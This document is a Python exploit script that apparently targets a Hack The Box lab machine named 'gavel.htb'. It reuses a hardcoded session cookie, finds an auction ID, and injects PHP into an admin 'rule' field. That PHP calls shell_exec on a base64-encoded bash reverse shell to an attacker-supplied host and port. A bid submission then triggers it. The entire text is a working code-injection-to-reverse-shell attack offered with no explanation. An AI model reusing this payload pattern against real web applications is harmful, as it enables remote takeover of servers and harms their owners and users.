import requests
import base64
import sys
import re

if len(sys.argv) < 3:
    print("Usage: python3 shell.py LHOST LPORT")
    sys.exit()

url = "http://gavel.htb"

LHOST = sys.argv[1]
LPORT = sys.argv[2]

session = requests.Session()
session.cookies.set("gavel_session","aidvrvre57oes0g6367agv1mia")

r = session.get(url + "/bidding.php")

auction_ids = re.findall(r'auction_id.*?value="(\d+)"', r.text)

if not auction_ids:
    print("No auction ID found")
    sys.exit()

auction_id = auction_ids[0]

print(f"[+] Found auction id: {auction_id}")

shell = f"/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
shellbase64 = base64.b64encode(shell.encode()).decode()


rule = f"$cmd='printf {shellbase64}|base64 -d|bash'; $out=shell_exec($cmd); return true;"


payload = {
    "auction_id": auction_id,
    "rule": rule,
    "message": "1"
}

r = session.post(url + "/admin.php", data=payload)

trigger = {
    "auction_id": auction_id,
    "bid_amount": "9999"
}

session.post(url + "/includes/bid_handler.php", data=trigger)

print("[+] trigger sent")
